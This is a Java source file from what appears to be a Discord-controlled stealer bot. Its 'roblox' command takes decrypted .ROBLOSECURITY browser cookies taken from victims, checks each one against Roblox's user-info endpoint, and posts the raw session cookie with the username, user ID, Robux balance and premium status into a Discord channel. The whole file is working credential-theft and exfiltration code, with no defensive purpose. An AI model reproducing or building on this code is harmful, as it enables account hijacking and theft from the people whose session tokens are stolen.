package me.vasler.command.impl;

import me.vasler.command.Command;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.json.JSONObject;

import java.util.ArrayList;

public class RobloxCommand extends Command {

    public static ArrayList<CookiesCommand.DecryptedCookie> roblosecurities = new ArrayList<>();

    public RobloxCommand() {
        super(new String[]{"roblox", "rblx", "roblosecurity"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        for(CookiesCommand.DecryptedCookie thing : roblosecurities) {
            try {
                String cookie = thing.getDecryptedValue();
                String username = "", userId = "", robux = "";
                boolean premium;

                OkHttpClient client = new OkHttpClient();
                Response resp = client.newCall(new Request.Builder().url("https://www.roblox.com/mobileapi/userinfo").addHeader("Cookie", ".ROBLOSECURITY=" + cookie).build()).execute();
                ResponseBody body = resp.body();
                JSONObject jsonObject = new JSONObject(body.string());
                userId = jsonObject.getInt("UserID") + "";
                robux = jsonObject.getInt("RobuxBalance") + "";
                username = jsonObject.getString("UserName") + "";
                premium = jsonObject.getBoolean("IsPremium");

                EmbedBuilder eb = new EmbedBuilder();
                eb.addField("Cookie", "```fix\n" + cookie + "```", false);
                eb.addField("Username", username, true);
                eb.addField("User ID", userId, true);
                eb.addField("Robux Balance", "R$" + robux, true);
                eb.addField("Has Premium", (premium ? ":thumbsup: :grin:" : ":thumbsdown: :sob:"), true);

                channel.sendMessageEmbeds(eb.build()).queue();
            } catch (Exception ignored) {}
        }
    }
}
